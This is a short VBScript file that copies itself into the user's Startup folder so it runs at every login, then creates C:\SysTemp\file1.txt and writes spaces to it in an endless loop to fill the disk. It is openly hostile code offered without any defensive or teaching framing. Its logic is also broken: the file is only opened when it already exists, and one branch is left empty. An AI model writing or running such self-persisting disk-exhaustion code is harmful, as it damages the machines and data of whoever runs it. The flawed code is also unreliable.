Dim fso, file, folderPath, autostartPath
Dim i, fileSize, targetSize, padding
Dim scriptPath, targetFile

Set fso = CreateObject("Scripting.FileSystemObject")
' Get the path of the script file itself
scriptPath = WScript.ScriptFullName

' Get the autostart folder path for the current user
autostartPath = CreateObject("WScript.Shell").SpecialFolders("Startup")

' Define the target file path in the autostart folder
targetFile = autostartPath & "\script.vbs"

' Copy the script to the autostart folder
fso.CopyFile scriptPath, targetFile
' Set folder and file paths
folderPath = "C:\SysTemp"
filePath = folderPath & "\file1.txt"

' Check if the folder already exists, create if it doesn't
If Not fso.FolderExists(folderPath) Then
    fso.CreateFolder(folderPath)
End If

' Check if file1.txt already exists
If fso.FileExists(filePath) Then
    Set file = fso.CreateTextFile(filePath, True)
Else
    ' Create or open the file (overwrite if it doesn't exist)
    
    
End If
    fileSize = 0
    padding = " " ' Single space to pad the file
    
    ' Infinite loop to keep writing padding to the file
    Do
        file.Write padding
        fileSize = fileSize + Len(padding)
    Loop
    ' The loop will never end unless manually stopped
    
    ' Clean up (won't be reached unless loop is stopped)
    Set file = Nothing
' Get the path of the script file itself

' Clean up
Set fso = Nothing
